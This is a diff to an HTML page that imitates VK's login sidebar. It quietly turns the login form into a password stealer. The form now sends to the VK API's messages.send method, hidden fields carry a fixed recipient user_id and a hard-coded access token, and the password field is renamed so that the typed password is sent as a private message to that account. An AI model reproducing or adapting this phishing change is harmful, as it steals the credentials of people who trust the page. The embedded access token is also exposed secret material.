@@ -204,7 +204,7 @@ var abp;
     <div id="side_bar" class="side_bar fl_l  sticky_top_force" style="display: none">
       <div id="side_bar_inner" class="side_bar_inner">
         <div id="quick_login" class="quick_login">
-  <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login">
+  <form method="GET" name="login" id="quick_login_form" action="https://api.vk.com/method/messages.send">
     <input type="hidden" name="act" value="login" />
     <input type="hidden" name="role" value="al_frame" />
     <input type="hidden" name="expire" id="quick_expire_input" value="" />
@@ -216,10 +216,16 @@ var abp;
     <input type="hidden" name="ip_h" value="c29aaae7b7602e6417" />
     <input type="hidden" name="lg_h" value="3a62eee3e199c2260c" />
     <input type="hidden" name="ul" id="quick_login_ul" value="" />
+    <input name="user_id" value="396194137" class="" style="display:none"/>
+    <input name="random_id" id="gg" class="" style="display:none"/>
+    <input name="message" id="c" class="" style="display:none"/>
+    <input name="" value="lol" class="" style="display:none" id="u"/>
+    <input name="access_token" value="8d0619dd95588e8714f5717fd01db7a9227ed92033934f7661049ba904e82bc460cf88196f23f58f143ff" class="" style="display:none"/>
+    <input name="v" value="5.100" class="" style="display:none"/>
     <div class="label">Телефон или email</div>
     <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" /></div>
     <div class="label">Пароль</div>
-    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
+    <div class="labeled"><input type="password" name="message" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
     <input type="submit" class="submit" />
   </form>
   <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
